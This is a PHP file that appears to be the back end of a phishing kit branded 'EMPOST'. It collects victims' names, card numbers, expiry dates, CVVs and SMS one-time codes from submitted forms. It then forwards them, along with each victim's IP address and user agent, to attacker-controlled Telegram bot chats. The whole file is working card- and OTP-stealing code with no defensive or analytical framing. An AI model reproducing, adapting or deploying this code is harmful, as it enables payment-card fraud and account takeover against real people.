<?php
require "../main.php";
 

$host = $_SERVER['SERVER_NAME'];
$ip =  $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d, H:i:s");

function post($data){
	if(empty(trim($data))){
		return "NO_DATA";
	}else{
		return htmlspecialchars($_POST[$data]);
	}
}


function sendBot($url){
	$ci = curl_init();
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_URL, $url);
	$res =  curl_exec($ci);
	curl_close($ci);
	return $res;
	

}


if(isset($_POST['d5'])){


for($i=1; $i<= 5; $i++){
	$_SESSION["d".$i] = $_POST["d".$i];
}
$_SESSION["d4"] = $_POST["d4"];
 

$telegram_content = urlencode("
[ EMPOST CC ]
Full name:   ".$_POST['d4']."
Card number:   ".$_POST['d5']."
Exp:   ".$_POST['d6']."
Cvv:   ".$_POST['d7']."

[ SYS INFO ]
Host: ".$host."
Ip: ".$ip."
Time: ".$time."
User agent: ".$ua
);
 
	foreach($ids as $id){
	$url = "https://api.telegram.org/bot".$bot."/sendMessage?chat_id=".$id."&text=".$telegram_content;
	sendBot($url);
	}
 
}





if(isset($_POST['otp'])){
$telegram_content = urlencode("
[ EMPOST SMS ]
CODE : ".$_POST['otp']."

[ SYS INFO ]
Ip: ".$ip."
Time: ".$time."
User agent: ".$ua);
 
foreach($ids as $id){
	$url = "https://api.telegram.org/bot".$bot."/sendMessage?chat_id=".$id."&text=".$telegram_content;
	sendBot($url);
	}
 
}


 
 

?>